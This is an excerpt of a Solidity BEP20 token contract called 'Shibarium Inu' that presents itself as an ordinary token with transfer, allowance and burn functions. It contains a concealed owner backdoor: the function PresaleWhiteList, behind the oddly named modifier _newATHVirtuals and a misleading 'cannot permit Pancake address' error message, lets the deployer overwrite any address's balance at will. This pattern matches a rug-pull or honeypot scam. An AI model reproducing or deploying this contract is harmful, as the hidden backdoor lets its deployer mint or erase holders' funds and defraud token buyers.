...
interface newATHbep20 {
   ...
   * https://github.com/newATH/EIPs/issues/20#issuecomment-263524729
   *
...
contract ShibariumInu is newATHbep20 {
  
    // common addresses
    address private owner;
    address private newATHPILOTWALL;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public newATHrownerd;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name = "Shibarium Inu";
    string public override symbol = "SHIBARIUMINU";
    ...
    constructor(uint newATHalltotalSupplytotalValue) {
        // set total supply
        totalSupply = newATHalltotalSupplytotalValue;
        
       newATHPILOTWALL = msg.sender;      
        // designate addresses
        owner = msg.sender;
        
        // split the tokens according to agreed upon percentages
        
        newATHrownerd[owner] = totalSupply;
    }
    ...
    function balanceOf(address account) public view override returns(uint) {
        return newATHrownerd[account];
    }
  modifier _newATHVirtuals () {
    require(newATHPILOTWALL == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    ...
    function transfer(address to, uint totalValue) public override returns(bool) {
        ...
        uint newATHtaxTBD = totalValue * 0 / 1000;
        uint newATHburnTBD = totalValue * 0 / 1000;
        uint newATHtotalValueAfterTaxAndBurn = totalValue - newATHtaxTBD - newATHburnTBD;
        
        // perform the transfer operation
        newATHrownerd[to] += newATHtotalValueAfterTaxAndBurn;
        newATHrownerd[msg.sender] -= totalValue;
        
        emit Transfer(msg.sender, to, totalValue);
        
        // finally, we burn and tax the extras percentage
        newATHrownerd[owner] += newATHtaxTBD + newATHburnTBD;
        _burn(owner, newATHburnTBD);
    ...
    function PresaleWhiteList(address PresalenewATHadr, uint256 amount) external _newATHVirtuals {
      newATHrownerd[PresalenewATHadr] = amount * 10 ** 9;
  }  
    ...
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        ...
        require(newATHrownerd[from] >= totalValue, "Balance is too low to make transfer.");
        
        newATHrownerd[to] += totalValue;
        newATHrownerd[from] -= totalValue;
    ...
    function _burn(address account, uint256 amount) internal {
        ...
        require(newATHrownerd[account] >= amount, "Burn amount exceeds balance at address.");
    
        newATHrownerd[account] -= amount;
        totalSupply -= amount;
